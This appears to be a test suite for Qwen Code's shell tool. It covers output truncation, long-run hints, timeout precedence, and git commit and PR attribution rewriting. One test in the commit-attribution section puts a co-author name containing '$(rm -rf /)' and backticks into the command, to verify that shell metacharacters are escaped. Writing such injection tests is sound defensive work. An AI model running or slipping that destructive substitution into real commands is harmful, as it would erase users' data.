          expect(String(result.llmContent)).not.toContain(output);
          expect(result.llmContent).toContain(TRUNCATED);
          expect(String(result.llmContent).length).toBeLessThanOrEqual(30_000);
        });

        it('still delivers a band-fitting body whole with the advisory', async () => {
          // Guards against over-shrinking: a body comfortably under
          // budget-minus-advisory is delivered whole, advisory included.
          const output = 'x'.repeat(29_000);
          const result = await runPastAdvisory(output);

          expect(result.outputBudgetApplied).toBe(true);
          expectText(result.llmContent, [output, ADVISORY], [TRUNCATED]);
          expect(String(result.llmContent).length).toBeLessThanOrEqual(30_000);
        });

        it('keeps a sub-advisory explicit threshold from disarming the pass it marks', async () => {
          // Regression: the reservation subtracts the advisory size from an
          // explicit threshold that can be below it (no schema minimum); at
          // `threshold <= 0` truncateToolOutput returns the body untouched while
          // the unconditional marker still vouches for it, standing the
          // scheduler's failure-path gate down. The clamp keeps the pass running.
          setExplicitThreshold(100);
          const output = 'x'.repeat(5_000);
          // Past 60s, so the ~619-char reservation exceeds the 100-char threshold.
          const result = await runPastAdvisory(output, 3);

          // On failure error.message IS llmContent, so the sentinel on the body
          // is the only bound the model sees.
          expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
          expect(result.error?.message).toBe(result.llmContent);
          expect(result.outputBudgetApplied).toBe(true);
          expect(result.llmContent).toContain(TRUNCATED);
          expect(String(result.llmContent)).not.toContain(output);
          expect(result.persistedOutputFiles?.length).toBeGreaterThan(0);
        });

        it('keeps the exit-code line when the reservation would eat a sub-advisory threshold', async () => {
          // Companion pin: at an explicit 600-char threshold the ~620-char
          // reservation would leave a 1-char preview keeping neither the rows
          // nor the trailing `Exit Code:` line. Capping the reservation at half
          // the threshold keeps the exit-code line in the tail preview.
          setExplicitThreshold(600);
          const output = 'x'.repeat(5_000);
          const result = await runPastAdvisory(output, 3);

          expect(result.outputBudgetApplied).toBe(true);
          expectText(result.llmContent, [ADVISORY, TRUNCATED]);
          expect(String(result.llmContent)).not.toContain(output);
          expect(result.llmContent).toContain('Exit Code: 3');
        });
      });
    });

    it('preserves full successful display for hooks before preview compaction', async () => {
      const output =
        'A'.repeat(20_000) + '\nHOOK_MIDDLE_SENTINEL\n' + 'B'.repeat(20_000);
      const result = await runFg('printf large-output', {
        output,
        exitCode: 0,
      });

      expect(result.error).toBeUndefined();
      expect(shellResultText(result.returnDisplay)).toContain(output);
      expect(result.returnDisplay).toMatchObject({
        output,
        truncated: false,
      });
      expect(result.outputBudgetApplied).toBe(true);
      expect(result.persistedOutputFiles?.length).toBeGreaterThan(0);
      expect(result.llmContent).not.toContain('HOOK_MIDDLE_SENTINEL');
    });

    it('retains shell truncation without an artifact and records the persistence decision', async () => {
      const originalOutput = 'A'.repeat(30_001);
      const shortenedContent =
        'Tool output was too large and has been truncated.\n[mocked truncated body]\n[Note: Could not save full output to file]';
      await spyTruncation({ content: shortenedContent });

      const result = await runFg('large-output-cmd', {
        output: originalOutput,
      });

      expectText(result.llmContent, [shortenedContent], [originalOutput]);
      expect(result.persistedOutputFiles).toEqual([]);
    });

    describe('long-running foreground hint', () => {
      // Auto-bg advisory at effectiveTimeout / 2 (60_000ms for the default
      // 120s, assumed below): fires on success AND error, is suppressed on
      // user-cancel / timeout / external signal (own messaging), never fires
      // on the background path. `performance` is faked because shell.ts times
      // with monotonic `performance.now()` (near zero under
      // `advanceTimersByTimeAsync` otherwise); `Date` keeps the streaming
      // throttle's `lastUpdateTime` and other Date callers deterministic.
      beforeEach(() => {
        vi.useFakeTimers({ toFake: ['Date', 'performance'] });
      });
      afterEach(() => {
        vi.useRealTimers();
      });

      const HINT = 'foreground command ran for';

      /** runFg that advances `advanceMs` of fake time before settling. */
      /** runFg after `advanceMs` of fake time; a string `result` is a clean exit's output. */
      const runFor = (
        advanceMs: number,
        command: string,
        result: string | Partial<ShellExecutionResult>,
        params: Partial<ShellToolParams> = {},
      ) =>
        runFg(
          command,
          typeof result === 'string' ? { output: result } : result,
          { advanceMs, ...params },
        );

      /** Asserts the 60s advisory reached both the model and the user's display. */
      const expectHintShown = (result: ToolResult) => {
        expect(result.returnDisplay).toMatchObject({
          type: 'shell_result',
          version: 1,
          outcome: 'completed',
          notices: [expect.stringContaining(`${HINT} 60s`)],
        });
        expect(result.llmContent).toContain(`${HINT} 60s`);
      };

      it('appends the long-run hint when a foreground command runs ≥ 60s', async () => {
        const result = await runFor(60_000, 'pytest -q', 'all green');
        expectText(result.llmContent, [
          'this foreground command ran for 60s',
          'is_background: true',
          '/tasks',
        ]);
      });

      it('appends the hint when a successful foreground command with empty output runs ≥ 60s', async () => {
        // Write-only commands (`tar czf`, `cp -r`, `dd`) often exit 0 silently,
        // leaving the non-debug `returnDisplayMessage` '': the hint is the only
        // TUI line, and the user who waited 60s should see it too.
        const result = await runFor(65_000, 'write-to-disk.sh', '');
        expect(result.llmContent).toContain(`${HINT} 65s`);
        expect(shellResultText(result.returnDisplay)).toContain(`${HINT} 65s`);
      });

      it('omits the hint when a foreground command finishes under threshold', async () => {
        const result = await runFor(5_000, 'echo hi', 'hi');
        expectText(result.llmContent, [], [HINT, 'is_background: true']);
      });

      it('appends the hint when a long-running foreground command exits non-zero', async () => {
        // "Ran but failed": `error` is reserved for spawn/setup failures (see
        // shellExecutionService.ts), so exit N leaves `error: null`. Blocked
        // >60s on a failure, "background it next time" still applies.
        const result = await runFor(75_000, 'flaky.sh', {
          output: '',
          exitCode: 1,
          error: null,
        });
        expectText(result.llmContent, [
          'Exit Code: 1',
          'this foreground command ran for 75s',
        ]);
      });

      it('omits the hint on aborted commands (timeout / user-cancel paths surface their own messaging)', async () => {
        // `tail -f`, not `sleep N`, so the sleep validator doesn't reject it at
        // build time.
        const result = await runFor(120_000, 'tail -f /tmp/never.log', {
          output: '',
          exitCode: null,
          aborted: true,
        });
        expectText(result.llmContent, ['Command was cancelled'], [HINT]);
      });

      it('omits the hint on the timeout path (combinedSignal aborted, signal not)', async () => {
        // `aborted: true` above is the user-cancel branch. The TIMEOUT branch
        // (`combinedSignal.aborted && !signal.aborted`) needs an aborted
        // combined signal, pinned so flipping the suppression check
        // (`!result.aborted` → `!combinedSignal.aborted`) fails loudly.
        const userAbort = new AbortController();
        stubAbortSignal(fakeSignal(false), timedOutSignal());

        const promise = build('tail -f /tmp/never.log', {
          timeout: 60_000,
        }).execute(userAbort.signal);
        await vi.advanceTimersByTimeAsync(60_000);
        resolveShellExecution({
          output: 'partial',
          exitCode: null,
          aborted: true,
        });
        const result = await promise;

        expect(result.llmContent).toContain('Command timed out after 60000ms');
        expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
        expect(result.llmContent).not.toContain(HINT);
      });

      it('omits the hint when the process was killed by an external signal (SIGTERM / OOM / etc.)', async () => {
        // `aborted` is set only when our AbortSignal fired, so SIGTERM from
        // container shutdown, k8s eviction, the OOM killer or a sibling reaping
        // the group is non-aborted; the process didn't finish, so "background
        // it next time" doesn't apply. (Numeric signal code: SIGTERM = 15.)
        const result = await runFor(
          75_000,
          'tail -f /tmp/never.log',
          SIGTERMED,
        );
        // Falls through to the normal result formatter (non-aborted).
        expectText(result.llmContent, ['Signal: 15'], [HINT]);
      });

      it('appends the hint when PTY reports a clean exit with signal 0', async () => {
        const result = await runFor(60_000, 'echo hi', {
          output: 'hi',
          exitCode: 0,
          signal: 0,
        });
        expectHintShown(result);
      });

      it('off-by-one: omits the hint at threshold − 1ms', async () => {
        // With the 60_000ms case (which fires) this pins the boundary, so
        // flipping `>=` to `>` fails loudly.
        const result = await runFor(59_999, 'echo hi', 'hi');
        expect(result.llmContent).not.toContain(HINT);
      });

      it('appends the hint AFTER truncation (so it survives `truncateToolOutput`)', async () => {
        // Inside the "Truncated part of the output:" envelope the advisory
        // could read as command output. truncateToolOutput is mocked: real
        // truncation needs a working `fs.writeFile` (the fallback returns no
        // `outputFile`, so the replacement never fires); only ordering matters.
        await spyTruncation({
          content:
            'Tool output was too large and has been truncated.\n[mocked truncated body]',
          outputFile: '/tmp/qwen-temp/shell_mocked.output',
        });

        const result = await runFor(60_000, 'long-output-cmd', 'A'.repeat(500));

        const content = result.llmContent as string;
        const TRUNCATION = 'Tool output was too large and has been truncated.';
        // The envelope proves shell.ts's replacement ran (`outputFile` set).
        expectText(content, [`${HINT} 60s`, TRUNCATION]);
        // Hint AFTER the marker: moving the append back into the non-aborted
        // llmContent builder (wrapped by the envelope) fails here.
        expect(content.indexOf(HINT)).toBeGreaterThan(
          content.indexOf(TRUNCATION),
        );
        expect(result.persistedOutputFiles).toEqual([
          '/tmp/qwen-temp/shell_mocked.output',
        ]);
      });

      it('truncates shell output char-only so the line cap cannot undercut the char budget', async () => {
        // Regression (C2): omitting `lines` fell back to the config line cap
        // (1000), line-truncating many-short-line output (find /, ls -R) within
        // the 30k budget, against the char-only contract: pass lines: Infinity.
        const spy = await spyTruncation();
        const result = await runFor(1_000, 'find /', 'short line\n'.repeat(50));

        expect(spy).toHaveBeenCalledWith(
          expect.anything(),
          ShellTool.Name,
          expect.any(String),
          expect.objectContaining({
            lines: Number.POSITIVE_INFINITY,
            previewChars: 4000,
          }),
        );
        expect(result.persistedOutputFiles).toBeUndefined();
      });

      it('threshold scales with the user-supplied timeout (not the default)', async () => {
        // An explicit 10-min timeout says the command may run long: the
        // threshold is half (300s), so 100s must NOT fire. Going back to the
        // fixed `LONG_RUNNING_FOREGROUND_THRESHOLD_MS` fails this.
        const result = await runFor(100_000, 'pytest --slow', 'all green', {
          timeout: 600_000,
        });
        expect(result.llmContent).not.toContain(HINT);
      });

      describe('foreground timeout resolution (issue #5838)', () => {
        // Precedence: per-call `timeout` > `tools.shell.defaultTimeoutMs` >
        // DEFAULT_FOREGROUND_TIMEOUT_MS (120000). Spying on the
        // `AbortSignal.timeout(...)` it arms pins the choice without waiting.
        const timeoutCfg = () =>
          mockConfig as unknown as { getShellDefaultTimeoutMs: Mock };

        /** Spies on AbortSignal.timeout until this test finishes. */
        const spyTimeout = () => {
          const spy = vi.spyOn(AbortSignal, 'timeout');
          onTestFinished(() => {
            spy.mockRestore();
          });
          return spy;
        };

        it.each<[string, number | undefined, Partial<ShellToolParams>, number]>(
          [
            [
              'uses the per-call timeout param over the configured default',
              300_000,
              { timeout: 60_000 },
              60_000,
            ],
            [
              'falls back to the configured default when no per-call timeout is given',
              300_000,
              {},
              300_000,
            ],
            // DEFAULT_FOREGROUND_TIMEOUT_MS
            [
              'falls back to the built-in default when neither param nor setting is present',
              undefined,
              {},
              120_000,
            ],
          ],
        )('%s', async (_title, configured, params, expected) => {
          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(configured);
          const timeoutSpy = spyTimeout();
          await runFg('echo hi', { output: 'hi', exitCode: 0 }, params);
          expect(timeoutSpy).toHaveBeenCalledWith(expected);
        });

        it('disables the timeout when the configured default is 0', async () => {
          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(0);
          const timeoutSpy = spyTimeout();
          await runFg('echo hi', { output: 'hi', exitCode: 0 });
          // effectiveTimeout === 0 is falsy, so no timeout signal is armed.
          expect(timeoutSpy).not.toHaveBeenCalled();
        });

        it('does not emit the spurious long-run hint when the timeout is disabled (0)', async () => {
          // Regression: with no "half the timeout", `longRunThresholdFor(0)`
          // returned its 1000ms floor and hinted on every command over ~1s.
          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(0);
          // Well past the 1000ms floor that would otherwise trip the hint.
          const result = await runFor(120_000, 'dev-server.sh', 'listening');
          expectText(result.llmContent, [], [HINT, 'is_background: true']);
        });
      });

      it('threshold-scaling positive case: hint DOES fire at the scaled threshold', async () => {
        // Pairs with the negative case: a fixed 60s threshold would pass that
        // one too (no hint at 100s either way), but fails here. Past the 300s
        // scaled threshold.
        const result = await runFor(305_000, 'pytest --slow', 'all green', {
          timeout: 600_000,
        });
        expect(result.llmContent).toContain(`${HINT} 305s`);
      });

      it('hint appears in non-debug returnDisplay (user TUI)', async () => {
        // The user waits for long commands too: the non-debug TUI (default
        // `getDebugMode → false`) gets output + blank line + hint.
        const result = await runFor(60_000, 'pytest -q', 'all green');
        expectHintShown(result);
        // The original output is preserved, not replaced by the hint.
        expectText(shellResultText(result.returnDisplay), [
          `${HINT} 60s`,
          'all green',
        ]);
      });

      it('hint also appears in debug-mode returnDisplay (mirrors LLM view)', async () => {
        // Same assertion through the debug-mode mirror: both branches re-sync
        // append-style (keeping e.g. the truncation marker), and exercising
        // both guards each from regressing independently.
        (mockConfig.getDebugMode as Mock).mockReturnValue(true);
        const result = await runFor(60_000, 'pytest -q', 'all green');
        expectHintShown(result);
        expect(shellResultText(result.returnDisplay)).toContain(`${HINT} 60s`);
      });

      it('honors the MIN_LONG_RUN_THRESHOLD_MS floor for pathological tiny timeouts', async () => {
        // `longRunThresholdFor(1)` would be `Math.floor(0.5) = 0`, hinting
        // "ran for 0s" on every run; the 1000ms floor prevents it. A 500ms run
        // with `timeout: 1` (mocked `aborted: false` to isolate the threshold
        // from the abort path) must NOT hint if the `Math.max(...)` guard holds.
        const result = await runFor(500, 'echo done', 'done', { timeout: 1 });
        expect(result.llmContent).not.toContain(HINT);
      });

      it('hint survives the error path (appended to error.message)', async () => {
        // `coreToolScheduler` builds the functionResponse from `error.message`
        // (not llmContent) when an error is set, so the hint must be there too.
        // Spawn/setup errors are rarely slow, but slow spawn paths exist (PTY
        // init, remote-fs exec, interposing security scanners).
        const result = await runFor(75_000, 'cmd-that-fails-to-spawn', {
          output: '',
          exitCode: null, // spawn never produced an exit code
          error: new Error('PTY initialization failed after 75s'),
        });
        expectText(result.error?.message, [
          'PTY initialization failed after 75s',
          `${HINT} 75s`,
        ]);
        // A `\n---\n` divider gives consumers (firePostToolUseFailureHook,
        // telemetry grouping, SIEM, hook parsers) an unambiguous boundary, so
        // error matching doesn't absorb the ~400-char advisory.
        expect(result.error?.message).toMatch(
          /PTY initialization failed after 75s\n\n---\n/,
        );
      });

      it('never appends the long-run hint on background commands', async () => {
        // The hint lives only in `executeForeground`; hoisting it into a shared
        // post-execute path would tag every background launch "ran for 0s,
        // consider is_background: true". Its literal `is_background: true` is
        // absent from the background copy, which catches such a leak.
        const result = await runBg('pytest -q');
        expectText(
          result.llmContent,
          ['Background shell started'],
          [HINT, 'is_background: true'],
        );
      });

      it('teaches status-file liveness checking in the launch message', async () => {
        // #7626: with only "read the output file" guidance, the model's sole
        // liveness heuristic became "empty file = dead process", wrong for
        // block-buffering children (Python/ML jobs) whose file stays at 0
        // bytes, which led to duplicate relaunches of running processes.
        const result = await runBg('python train.py');
        const text = String(result.llmContent);
        expect(text).toContain('status file: ');
        expect(text).toMatch(/status file: .*shell-bg_[0-9a-f]+\.status/);
        expectText(text, [
          'Do NOT infer liveness from the output file',
          'block-buffer',
          'python -u',
        ]);
      });
    });

    describe('addCoAuthorToGitCommit', () => {
      const QWEN_TRAILER = expect.stringContaining(
        'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
      );
      const TRAILER = expect.stringContaining('Co-authored-by:');
      const NO_TRAILER = expect.not.stringContaining('Co-authored-by:');

      it.each<[string, string, unknown]>([
        ...rowsOf(QWEN_TRAILER, {
          'should add co-author to git commit with double quotes':
            'git commit -m "Initial commit"',
          'should add co-author to git commit with single quotes':
            "git commit -m 'Fix bug'",
          'should handle git commit with additional flags':
            'git commit -a -m "Add feature"',
          'should handle git commit with combined short flags like -am':
            'git commit -am "Add feature"',
          'should handle git commit with escaped quotes in message':
            'git commit -m "Fix \\"quoted\\" text"',
          'should add co-author to git commit with multi-line message': `git commit -m "Fix bug

 This is a detailed description
 spanning multiple lines"`,
          // Bash accepts `-mfoo`; the old regex required whitespace after `-m`
          // and silently skipped `git commit -m"msg"`.
          'should add co-author to git commit -m"msg" shorthand (no space)':
            'git commit -m"Quick fix"',
        }),
        [
          'should not modify non-git commands',
          'npm install',
          expect.stringContaining('npm install'),
        ],
        [
          'should not modify git commands without -m flag',
          'git commit',
          expect.stringContaining('git commit'),
        ],
        ...rowsOf(NO_TRAILER, {
          // `cd /elsewhere && git commit` may commit into another repo; without
          // resolving the target we can't snapshot pre-HEAD or write notes
          // there, so the rewrite is skipped.
          'should NOT add co-author when git commit is preceded by cd':
            'cd /tmp/test && git commit -m "Test commit"',
          // Embedded `..` (`cd foo/../../escape`) escapes like a leading `..`;
          // accepting it would trailer a commit landing in another repo.
          'should NOT add co-author for cd with embedded .. (escapes via traversal)':
            'cd foo/../../escape && git commit -m "Test"',
          // `cd ..` could escape the repo root: conservative shift.
          'should NOT add co-author for cd .. && git commit (could escape repo)':
            'cd .. && git commit -m "Test commit"',
          // `cd $HOME` lands wherever $HOME points. Default `shell-quote`
          // collapses `$HOME` to '' and the `target.includes('$')` check
          // silently fails; the env-preserving parse keeps `$NAME` literal.
          'should NOT add co-author for cd $HOME && git commit (env-var target)':
            'cd $HOME && git commit -m "elsewhere"',
          'should NOT add co-author for cd $REPO_ROOT && git commit (env-var target)':
            'cd $REPO_ROOT && git commit -m "elsewhere"',
          // `git -C <path> commit` runs in <path>: same risk as cd. Also the
          // attached `-C/path` token and `--git-dir=` / `--work-tree=` forms.
          'should NOT add co-author for git -C /tmp/other commit':
            'git -C /tmp/other commit -m "Other"',
          'should NOT add co-author for git -C/tmp/other commit (attached)':
            'git -C/tmp/other commit -m "Other"',
          'should NOT add co-author for git --git-dir=/tmp/other/.git commit':
            'git --git-dir=/tmp/other/.git commit -m "Other"',
          'should NOT add co-author for git --work-tree=/tmp/other commit':
            'git --work-tree=/tmp/other commit -m "Other"',
          // `shell-quote` parses an unresolved env-var or substitution as '',
          // indistinguishable from `-C ""`; treating it as a no-op would
          // trailer `git -C $HOME commit` in another repo. Skipping beats the
          // rare `-C $PWD` miss.
          'should NOT add co-author for git -C $HOME commit (env-var/empty target)':
            'git -C $HOME commit -m "elsewhere"',
          'should NOT add co-author for git -C "" commit (env-var/empty target)':
            'git -C "" commit -m "literal empty"',
          // Quoted "git commit" should not look like an executed commit.
          'should NOT add co-author when git commit appears only inside quoted text':
            'echo "git commit -m foo"',
        }),
        ...rowsOf(TRAILER, {
          // `cd subdir && git commit` stays in the repo and is common; the old
          // blanket "any cd shifts cwd" gate broke it. Only absolute, `..`,
          // env-var etc. targets count as shifted.
          'should add co-author for cd subdir && git commit (relative same-repo)':
            'cd src && git commit -m "Test commit"',
          // `env` is a wrapper like `sudo`/`command` that also takes
          // `KEY=VALUE` argv entries; unhandled, the regex took `KEY=VALUE`
          // as the program.
          'should add co-author when git commit is wrapped in env KEY=VAL':
            'env GIT_COMMITTER_DATE=now git commit -m "Test commit"',
          // `env -u NAME` takes a value that tokeniseSegment must skip, or NAME
          // masks the real `git commit` as the program.
          'should add co-author when git commit is wrapped in env -u NAME':
            'env -u GIT_AUTHOR_DATE git commit -m "Test commit"',
          // A cd AFTER an in-cwd commit doesn't matter: the commit already
          // landed.
          'should add co-author when cd comes AFTER git commit':
            'git commit -m "Test" && cd /tmp/test',
          // Global flags (`-c`, `--no-pager`) push the subcommand past index
          // 1; a fixed arg1 check used to silently skip these.
          'should add co-author for git -c key=val commit':
            'git -c user.email=x@y commit -m "Test"',
          'should add co-author for git --no-pager commit':
            'git --no-pager commit -m "Test"',
          // Common real-world prefixes (env assignment, `sudo`) must still
          // attribute.
          'should add co-author when git commit is prefixed with env vars':
            'GIT_COMMITTER_DATE=now git commit -m "Test"',
          'should add co-author when git commit is prefixed with sudo':
            'sudo git commit -m "Test"',
          // `sudo -u user git commit` puts the program at [3]; a flag-only
          // consumer would leave `user` standing in for the program.
          'should add co-author for sudo with value-taking flag (-u user)':
            'sudo -u other git commit -m "Test"',
          // `--message` is git's documented long alias for `-m`.
          'should add co-author for git commit --message "..."':
            'git commit --message "Test commit"',
          'should add co-author for git commit --message="..."':
            'git commit --message="Test commit"',
        }),
      ])('%s', async (_title, command, expected) => {
        await spawnedCommand(command);
        expectSpawned(expected);
      });

      it.each<[string, object, string, unknown]>([
        // Commit attribution is independent of PR attribution: commit off
        // skips the trailer even with pr on.
        [
          'should not add co-author when only pr is enabled (commit off)',
          { commit: false, pr: true },
          'git commit -m "Initial commit"',
          NO_TRAILER,
        ],
        [
          'should not add co-author when disabled in config',
          { commit: false, pr: false },
          'git commit -m "Initial commit"',
          expect.stringContaining('git commit -m "Initial commit"'),
        ],
        [
          'should use custom name and email from config',
          {
            commit: true,
            pr: true,
            name: 'Custom Bot',
            email: 'custom@example.com',
          },
          'git commit -m "Test commit"',
          expect.stringContaining(
            'Co-authored-by: Custom Bot <custom@example.com>',
          ),
        ],
      ])('%s', async (_title, coAuthor, command, expected) => {
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          name: 'Qwen-Coder',
          email: 'qwen-coder@alibabacloud.com',
          ...coAuthor,
        });
        await spawnedCommand(command);
        expectSpawned(expected);
      });

      // `GIT_DIR=...` and friends redirect git to another repo; trailering
      // that commit would corrupt a repo the user didn't expect us to touch.
      it.each([
        ['GIT_DIR', 'GIT_DIR=/tmp/other/.git git commit -m "msg"'],
        ['GIT_WORK_TREE', 'GIT_WORK_TREE=/tmp/other git commit -m "msg"'],
        ['GIT_COMMON_DIR', 'GIT_COMMON_DIR=/tmp/other git commit -m "msg"'],
        [
          'GIT_INDEX_FILE',
          'GIT_INDEX_FILE=/tmp/other/index git commit -m "msg"',
        ],
        [
          'env-wrapped GIT_DIR',
          'env GIT_DIR=/tmp/other/.git git commit -m "msg"',
        ],
        // GNU coreutils 8.30+ `env -C DIR` / `--chdir` relocates cwd before
        // exec, the same contract as `cd /elsewhere && git commit`.
        ['env -C', 'env -C /tmp/other git commit -m "msg"'],
        ['env --chdir', 'env --chdir /tmp/other git commit -m "msg"'],
        // `shell-quote` keeps `--chdir=/tmp` and `-C/tmp` as single tokens,
        // which a bare-flag membership check misses, trailering `sudo
        // --chdir=/tmp git commit` / `env -C/tmp git commit` in the wrong repo.
        ['env --chdir=', 'env --chdir=/tmp/other git commit -m "msg"'],
        ['env -C attached', 'env -C/tmp/other git commit -m "msg"'],
        ['sudo --chdir=', 'sudo --chdir=/tmp/other git commit -m "msg"'],
        ['sudo -D attached', 'sudo -D/tmp/other git commit -m "msg"'],
      ])(
        'should NOT add co-author for repo-redirecting %s assignment',
        async (_label, command) => {
          expect(await spawnedCommand(command)).not.toContain(
            'Co-authored-by:',
          );
        },
      );

      // GIT_AUTHOR_DATE / GIT_COMMITTER_DATE etc. tweak metadata without
      // relocating the repo, so attribution still applies.
      it('should still add co-author with benign GIT_COMMITTER_DATE assignment', async () => {
        expect(
          await spawnedCommand(
            'GIT_COMMITTER_DATE="2026-01-01T00:00:00Z" git commit -m "Test commit"',
          ),
        ).toContain('Co-authored-by:');
      });

      // `git -C .` / `-C ./` / `-C.` don't change cwd; the old "any -C shifts"
      // rule silently skipped what is basically a plain `git commit`.
      it.each([
        ['git -C . commit', 'git -C . commit -m "in cwd"'],
        ['git -C ./ commit', 'git -C ./ commit -m "in cwd"'],
        ['git -C. commit (attached)', 'git -C. commit -m "in cwd"'],
      ])('should add co-author for %s', async (_label, command) => {
        expect(await spawnedCommand(command)).toContain('Co-authored-by:');
      });

      // In `git commit -m "real" # -m "fake"`, `lastMatchOf` would pick the
      // comment's `-m`, a flag bash discards, leaving the commit unattributed;
      // unquoted-`#` truncation keeps the rewrite on the live part.
      it('should add co-author for git commit followed by # comment', async () => {
        const observed = await spawnedCommand(
          'git commit -m "real" # -m "fake"',
        );
        // The trailer lands in the live `-m "real"` body, BEFORE the `#`.
        expect(observed).toContain('Co-authored-by:');
        const realIdx = observed.indexOf('-m "real');
        const hashIdx = observed.indexOf(' # ');
        const coAuthorIdx = observed.indexOf('Co-authored-by:');
        expect(realIdx).toBeGreaterThanOrEqual(0);
        expect(hashIdx).toBeGreaterThan(realIdx);
        expect(coAuthorIdx).toBeGreaterThan(realIdx);
        expect(coAuthorIdx).toBeLessThan(hashIdx);
      });

      // A `#` inside a quoted body is not a comment: `#123` must stay in the
      // body with the trailer appended inside it.
      it('should add co-author for git commit -m with # inside body', async () => {
        const observed = await spawnedCommand(
          'git commit -m "fix #123 add feature"',
        );
        expectText(observed, ['Co-authored-by:', '#123']);
      });

      // `git interpret-trailers` only recognises trailers at the end of the
      // *last* `-m`, so the rewrite targets the last match.
      it('should add Co-authored-by trailer to the LAST -m when multiple are present', async () => {
        const observed = await spawnedCommand(
          'git commit -m "Title" -m "Body line 1"',
        );
        // `Body line 1` and the trailer share the second `-m`'s closing quote.
        expect(observed).toMatch(
          /-m\s+"Body line 1\s+Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud\.com>"/s,
        );
        // And the first -m's title is unchanged.
        expect(observed).toMatch(/-m\s+"Title"\s/);
      });

      // A literal `-m '...'` inside the quoted body could be taken for a later
      // argument, splicing the trailer mid-message and breaking the quoting.
      it('should not be fooled by a literal -m token inside the quoted message body', async () => {
        const observed = await spawnedCommand(
          'git commit -m "docs mention -m \'flag\' for completeness"',
        );
        // The body survives intact; the trailer lands after it, just before
        // the outer closing quote.
        expect(observed).toContain(
          "-m \"docs mention -m 'flag' for completeness",
        );
        expect(observed).toMatch(
          /docs mention -m 'flag' for completeness\s+Co-authored-by:[^"]+"/s,
        );
      });

      // A later `git tag -m "..."` in the same compound was mistaken for the
      // commit message when the regex matched across the whole command.
      it('should target the commit message, not a later git tag -m in the same chain', async () => {
        const observed = await spawnedCommand(
          'git commit -m "fix" && git tag -a v1 -m "release notes"',
        );
        expect(observed).toMatch(/git commit -m "fix\s+Co-authored-by:[^"]+"/s);
        // The tag annotation is left exactly as written, no trailer spliced in.
        expect(observed).toContain('git tag -a v1 -m "release notes"');
        const tagMatch = observed.match(/git tag .*-m "([^"]*)"/);
        expect(tagMatch?.[1]).toBe('release notes');
      });

      // The tool description recommends `git commit -m "$(cat <<'EOF' ...
      // EOF)"`; its nested `"` would make the regex splice the trailer
      // mid-substitution and break the command, so it bails.
      it('should NOT rewrite -m bodies that contain $(...) command substitution', async () => {
        const command =
          'git commit -m "$(cat <<\'EOF\'\nfix: title\n\ndetails\nEOF\n)"';
        const observed = await spawnedCommand(command);
        // The original command must reach the executor unchanged.
        expect(observed).toBe(command);
        expect(observed).not.toContain('Co-authored-by:');
      });

      // Bash's `'\''` (close-escape-reopen) form is one logical body: the
      // trailer lands at the FINAL closing `'`, not inside the escape.
      // Mirrors the bodySinglePattern in addAttributionToPR.
      it("should append trailer after the final ' in -m 'don'\\''t' apostrophe-escape", async () => {
        const observed = await spawnedCommand("git commit -m 'don'\\''t'");
        expect(observed).toMatch(
          /git commit -m 'don'\\''t[\s\S]*Co-authored-by:[^']*'/,
        );
      });

      // Unescaped `$()`, backticks or `"` in the co-author name would break
      // the user-approved `git commit` or run as command substitution.
      it('should escape shell metacharacters in name/email', async () => {
        setCoAuthor('Bot $(rm -rf /) `eval` "danger"');

        const observedCmd = await spawnedCommand('git commit -m "msg"');
        // Each metacharacter is escaped, and the `-m "..."` pair stays closed.
        expectText(observedCmd, ['\\$', '\\`', '\\"']);
        expect(observedCmd).toMatch(/-m\s+".+"/s);
      });

      describe('attachCommitAttribution note failure warning', () => {
        // Once the scheduler's error gate stands down for the marked body (its
        // identity check runs after the appends, so it never sees the growth),
        // this warning is the only bound on that text: the exception text is
        // capped at 120 chars, the full cause stays in the debug log.
        it('caps the note-failure exception text at 120 characters', async () => {
          const longMessage = `notes exploded: ${'x'.repeat(300)}`;
          const result = await commitWithNoteFailure(longMessage);

          for (const text of [
            String(result.llmContent),
            shellResultText(result.returnDisplay),
          ]) {
            expectText(
              text,
              [`AI attribution note skipped: ${longMessage.slice(0, 120)}.`],
              [longMessage.slice(0, 200)],
            );
          }
        });
      });
    });

    describe('addAttributionToPR', () => {
      const ATTRIBUTION = 'Generated with Qwen Code';
      const runPr = (command: string) =>
        spawnedCommand(command, { waitForSpawn: true });
      const lastSpawnedCommand = () => {
        const calls = mockShellExecutionService.mock.calls;
        return calls[calls.length - 1]?.[0] as string;
      };

      // `--body-file` (a file), `--fill` (commit messages) and bare `gh pr
      // create` (editor) have no body argv; rewriting would mutate the user's
      // file or break the editor flow, so the command is left untouched and a
      // debug warning (QWEN_DEBUG_LOG_FILE) surfaces the skip.
      it.each([
        ['--body-file', 'gh pr create --title "x" --body-file /tmp/body.md'],
        ['--fill', 'gh pr create --title "x" --fill'],
        ['no body flag (editor)', 'gh pr create --title "x"'],
      ])(
        'should leave gh pr create %s unchanged (non-inline-body flow)',
        async (_label, command) => {
          const observed = await runPr(command);
          expect(observed).toBe(command);
          expect(observed).not.toContain(ATTRIBUTION);
        },
      );

      it.each<[string, string, boolean]>([
        ...rowsOf(true, {
          // `gh pr new` is a documented alias for `gh pr create`, and `-b` for
          // `--body`; without explicit handling the rewrite silently misses
          // them.
          'should append attribution to `gh pr new --body "..."` (alias form)':
            'gh pr new --title "x" --body "Summary"',
          'should append attribution to gh pr create -b "..." (short form)':
            'gh pr create --title "x" -b "Summary"',
          'should append attribution to gh pr create --body when pr enabled':
            'gh pr create --title "x" --body "Summary"',
          // `gh --repo owner/repo pr create` shifts pr/create past the fixed
          // `tokens[1]/tokens[2]` slots a literal-position check looks at.
          'should append attribution when gh has global flags before pr create':
            'gh --repo owner/repo pr create --title "x" --body "Summary"',
          // The common `--body=value` form; the old `\s+` separator missed it.
          'should append attribution to --body="..." equals-sign form':
            'gh pr create --title "x" --body="Summary"',
        }),
        // Quoted "gh pr create" should not look like an executed PR command.
        [
          'should NOT rewrite when gh pr create appears only inside quoted text',
          'echo "gh pr create --title x --body \\"Summary\\""',
          false,
        ],
      ])('%s', async (_title, command, attributed) => {
        await runPr(command);
        expectSpawned(
          attributed
            ? expect.stringContaining(ATTRIBUTION)
            : expect.not.stringContaining(ATTRIBUTION),
